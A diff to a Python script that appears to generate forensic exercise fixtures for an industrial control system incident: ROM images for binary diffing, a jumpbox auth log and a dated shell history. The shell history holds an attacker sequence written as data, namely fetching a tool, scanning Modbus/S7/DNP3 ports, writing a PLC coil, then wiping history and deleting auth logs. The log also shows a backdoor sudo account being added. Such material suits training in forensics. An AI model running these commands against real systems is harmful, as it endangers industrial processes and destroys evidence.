@@ -380,6 +380,8 @@ def make_gb_rom(path: str) -> None:
             b"PLANT TRIP - LEVEL LOW\x00SERVICE MODE\x00ENTER KEY SEQUENCE\x00"
             b"MAINT ARCHIVE\x00")
     rom[0x4000:0x4000 + len(text)] = text
+    # bank 1 also carries the rig's engineering constants
+    rom[0x5000:0x5010] = struct.pack("<ffff", 1.5, 4.25, 10.0, 0.5)
     # bank 2: a zlib archive blob
     blob = zlib.compress(b"ARCHIVE v1\nshift log entry\nTOKEN-PLACEHOLDER-0001\n" * 4)
     rom[0x8000:0x8000 + len(blob)] = blob
@@ -418,6 +420,59 @@ def make_dos_com(path: str) -> None:
         fh.write(bytes(code))
 
 
+
+# ------------------------------------------------------------------- logs
+def make_auth_log(path: str) -> None:
+    """A Linux auth log covering the same window as the captures."""
+    lines = [
+        "Nov 14 22:12:48 jumpbox sshd[2211]: Failed password for invalid user admin from 10.2.0.77 port 51122 ssh2",
+        "Nov 14 22:12:51 jumpbox sshd[2211]: Failed password for invalid user admin from 10.2.0.77 port 51126 ssh2",
+        "Nov 14 22:12:55 jumpbox sshd[2213]: Invalid user operator from 10.2.0.77",
+        "Nov 14 22:13:02 jumpbox sshd[2217]: Accepted password for svc_hmi from 10.2.0.77 port 51140 ssh2",
+        "Nov 14 22:13:02 jumpbox systemd-logind[640]: New session 42 of user svc_hmi.",
+        "Nov 14 22:13:05 jumpbox sudo:  svc_hmi : TTY=pts/0 ; PWD=/home/svc_hmi ; USER=root ; COMMAND=/usr/bin/apt-get install -y python3-pymodbus",
+        "Nov 14 22:13:09 jumpbox useradd[2240]: new user: name=maint, UID=1004, GID=1004, home=/home/maint, shell=/bin/bash",
+        "Nov 14 22:13:10 jumpbox usermod[2242]: add 'maint' to group 'sudo'",
+        "Nov 14 22:13:18 jumpbox sshd[2250]: Accepted publickey for maint from 10.2.0.77 port 51190 ssh2",
+        "Nov 14 22:13:45 jumpbox systemd[1]: Stopped Historian Collector Service.",
+    ]
+    with open(path, "w") as fh:
+        fh.write("\n".join(lines) + "\n")
+
+
+def make_bash_history(path: str) -> None:
+    """A shell history recorded with HISTTIMEFORMAT, so every command is dated."""
+    base = 1700000000
+    entries = [
+        (base - 10, "id"),
+        (base - 6, "cat /etc/hosts"),
+        (base - 2, "curl -s http://10.2.0.77:8000/mbtool.py -o /tmp/mbtool.py"),
+        (base + 4, "nmap -Pn -p 502,102,47808,20000 10.20.30.0/24"),
+        (base + 60, "python3 /tmp/mbtool.py --write-coil 17 0 172.16.5.10"),
+        (base + 120, "echo '' > ~/.bash_history"),
+        (base + 130, "rm -f /var/log/auth.log.1"),
+    ]
+    with open(path, "w") as fh:
+        for ts, cmd in entries:
+            fh.write(f"#{ts}\n{cmd}\n")
+
+
+def make_rom_v2(src: str, dst: str) -> None:
+    """A second build of the ROM, with one patched constant - for bin-diff."""
+    with open(src, "rb") as fh:
+        rom = bytearray(fh.read())
+    rom[0x4000:0x4010] = b"PUMP P-101 MOD\x00\x00"[:16]
+    rom[0x5000:0x5004] = struct.pack("<f", 9.75)
+    s = 0
+    for b in rom[0x134:0x14D]:
+        s = (s - b - 1) & 0xFF
+    rom[0x14D] = s
+    g = (sum(rom) - rom[0x14E] - rom[0x14F]) & 0xFFFF
+    rom[0x14E:0x150] = g.to_bytes(2, "big")
+    with open(dst, "wb") as fh:
+        fh.write(rom)
+
+
 def main() -> None:
     out = sys.argv[1] if len(sys.argv) > 1 else "fixtures"
     os.makedirs(out, exist_ok=True)
@@ -429,6 +484,9 @@ def main() -> None:
     make_tds(os.path.join(out, "cleartext_dmz.pcap"))
     make_gb_rom(os.path.join(out, "rig.gb"))
     make_dos_com(os.path.join(out, "SETPT16.COM"))
+    make_auth_log(os.path.join(out, "jumpbox_auth.log"))
+    make_bash_history(os.path.join(out, "jumpbox_bash_history"))
+    make_rom_v2(os.path.join(out, "rig.gb"), os.path.join(out, "rig_v2.gb"))
     print("fixtures written to", out)
 
 
